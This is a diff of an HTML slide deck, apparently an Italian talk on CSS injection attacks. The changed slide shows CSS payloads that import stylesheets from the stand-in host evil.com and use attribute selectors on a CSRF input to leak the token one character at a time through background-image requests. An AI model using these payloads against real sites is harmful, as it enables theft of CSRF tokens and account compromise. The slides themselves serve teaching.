@@ -111,19 +111,24 @@ input[name="csrf"][value$="="] ~ * {
 </p-slide>
 <p-slide>
   <div class="two-columns align-center">
-    <pre class="language-css"><code>@import url(//evil.com/exfil?l=0);
-@import url(//evil.com/exfil?l=1);
-@import url(//evil.com/exfil?l=2);
-@import url(//evil.com/exfil?l=3);
-@import url(//evil.com/exfil?l=4);
-@import url(//evil.com/exfil?l=5);
-@import url(//evil.com/exfil?l=6);
-@import url(//evil.com/exfil?l=7);
-@import url(//evil.com/exfil?l=8);
-@import url(//evil.com/exfil?l=9);
-...</code></pre>
-    <p-fragment><video src="img/exfil.webm" alt="Clip di un log di rete durante esfiltrazione di dati" style="width: 100%;" autoplay loop muted></p-fragment>
+    <div>
+      <pre class="language-css"><code>@import url(//evil.com/xf.css);</code></pre>
+      <p-fragment style="display: block;">
+        <pre class="language-css"><code>@import url(/xf.css?ab12);
+...
+input[name=csrf][value^=k] {
+  background: url(//xf.gif?ab12-k) }</code></pre>
+      </p-fragment>
+      <p-fragment style="display: block;">
+        <pre class="language-css"><code>@import url(/xf.css?ab12-k);
+...
+input[name=csrf][value^=k3] {
+  background: url(//xf.gif?ab12-k3)}</code></pre>
+      </p-fragment>
+    </div>
+    <p-fragment><video src="img/exfil.mp4" alt="Clip di un log di rete durante esfiltrazione di dati" style="width: 100%;" autoplay loop muted></p-fragment>
   </div>
+  <p-fragment class="landing" style="top: 55%; right: 5%;"><div style="font-size: 2.5em; transform: rotate(20deg);">😱</div></p-fragment>
 </p-slide>
 <p-slide>
   <h4 class="center">Non sono solo gli <code>&lt;input></code>&hellip;</h4>
